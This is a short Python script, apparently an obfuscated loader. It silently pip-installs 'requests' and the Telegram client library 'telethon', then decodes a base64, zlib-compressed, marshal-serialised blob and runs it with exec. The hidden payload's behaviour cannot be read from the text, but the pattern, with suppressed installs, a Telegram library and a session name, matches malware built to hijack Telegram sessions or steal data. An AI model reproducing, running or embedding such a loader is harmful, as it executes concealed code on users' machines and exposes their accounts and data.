import subprocess
import sys
import base64
import zlib
import marshal
import os

subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
subprocess.check_call([sys.executable, "-m", "pip", "install", "telethon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

session_name = globals().get("session_name", "unknown")

# DATA
DATA = "eJxlUc9rE0EUntnZzc62jU1oC7YqWnsxRRP7i9RSi4uRIpRCpagJQthkpm3sZjfOTKyGDeTgIZ70ZkGFHqP14L/gf5CCxbD25smb2oPQk7NNogXfwPdm3o/vfcPLgxOGOv5wXMIrQACBNsi0PcxAojwDGUUBVKFoF7ZLIXgKY+h7cF3OwxNcoQ7fYaPNBauyv6p4gKCKjFQRUT34GhDtLaqq4m+nh0hoV2nfZ0BVI7qHPG1NKcBqiGAv8Lro6gQPVfCfeaoX8vQPxi7qKiTHp8sqFYMxMAE43FIgSMt3EHmC0mALxnqWK/HkbHLy6vTM7MT0nGkuZvndzfStqXur12bvbOWS1uMrNHU/M2lNLZWdtJlasYMx6tJ7WwMVHOeU84LrVM5uCFHic4mEVSrEBbXpOrOKcZetJ3KuqIQTnDok5ebLReoIX2E5H5PuS89vWCJbIDHF19YKNuW+SixhxZCvuiXq+JjRR2XKhYyXXC5i2O/rTM06VpH6hpyQFe4mdZgmpf3LBmQ+KjPbh2ssWA/TJXAs4ULHjvA8F6zgrC8EbQ7JdnpZVBYFbJxKqIFW5EbtduvU6dpia+D8zvjewOXaUqvvUmO40fvxerPHrN08MMJ1ezv12RjdWWlFz2zbDbN5Lt6MJOpaKzK8nWz2j9XVAxx5EX4efpnfGWqs7uPJ3zroufjFGN0zRo94r5z0ZszE6BPWzKgeU5kRfEdx+bEaFuTfgcNgpSwSZPB80SVlmy6woeM1S7UjEn4gCOE30P8VGL9UDKd+DgIYrj/YByNsUKb/AO/uvaQ="
secure_data = DATA
payload = marshal.loads(zlib.decompress(base64.b64decode(secure_data)))
exec(payload)
